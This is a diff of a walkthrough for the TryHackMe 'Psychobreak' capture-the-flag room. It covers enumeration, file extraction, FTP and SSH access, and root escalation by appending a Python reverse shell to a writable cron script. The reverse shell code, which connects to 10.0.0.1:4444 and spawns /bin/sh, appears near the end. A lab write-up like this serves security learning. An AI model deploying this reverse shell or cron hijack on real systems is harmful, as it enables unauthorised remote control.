@@ -20,14 +20,12 @@ Deploy the VM and let’s go…
 First up is enumeration
 
 ## Task 1
----
 
 ![nmap](/assets/img/tryhackme/psychobreak/3.png)
 <p>A simple nmap scan would give the answers to the first task. So I tried to login to the ftp service. Anonymous login is not enabled in ftp service. So let’s move on to http.</p>
 
 
 ## Task 2
----
 
 ![http_service](/assets/img/tryhackme/psychobreak/4.png)
 <p> In the source page we can find the room name. Let’s go into the room.</p>
@@ -72,7 +70,7 @@ First up is enumeration
 <p>I downloaded the two files after moving into the other directory that was returned in the response.</p>
 
 ## Task 3
----
+
 <p>The text file is just a message so I extracted the zip file. Extract the contents of the image file using binwalk since it was corrupted.</p>
 
 <pre>binwalk -e image.jpg</pre>
@@ -87,10 +85,10 @@ First up is enumeration
 ![FTP_creds](/assets/img/tryhackme/psychobreak/28.png)
 
 ## Task 4
----
+
 <p>I found two files in the ftp server and I downloaded using the get command.</p>
 
-<pre>get <file-name></pre>
+<pre>get file-name</pre>
 ![program](/assets/img/tryhackme/psychobreak/30.png)
 
 <p>After running the program file I found that it takes a word as a argument. So, I ran the bash script.</p>
@@ -107,7 +105,7 @@ done
 
 
 ## Task 5
----
+
 <p>The decoded text is the SSH password. Without further wait, let’s login to ssh.</p>
 
 ![ssh_login](/assets/img/tryhackme/psychobreak/34.png)
@@ -116,14 +114,14 @@ done
 ![ssh_hidden_dirs](/assets/img/tryhackme/psychobreak/35.png)
 <p>After reading the .readThis.txt file, it seems there is a file with the name the_eye_of_ruvik. So, I checked the /etc/crontab and I was right, there is a file named .the_eye_of_ruvik.py that runs as root for very 30 secs and whats more is we can edit the file.</p>
 
-```
+<pre>
 import socket,subprocess,os
 s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
 s.connect(("10.0.0.1",4444));os.dup2(s.fileno(),0)
 os.dup2(s.fileno(),1)
 os.dup2(s.fileno(),2)
 p=subprocess.call(["/bin/sh","-i"])
-```
+</pre>
 
 <p>So, I appended the python reverse shell in the file and opened a netcat listener in my local machine. After a few seconds I got the reverse shell.</p>
 
@@ -131,7 +129,7 @@ p=subprocess.call(["/bin/sh","-i"])
 <p>We also got the root flag.</p>
 
 ## Bonus
----
+
 ![bonus_flag](/assets/img/tryhackme/psychobreak/40.png)
 
 <p>The bonus task is to delete the user ruvik</p>
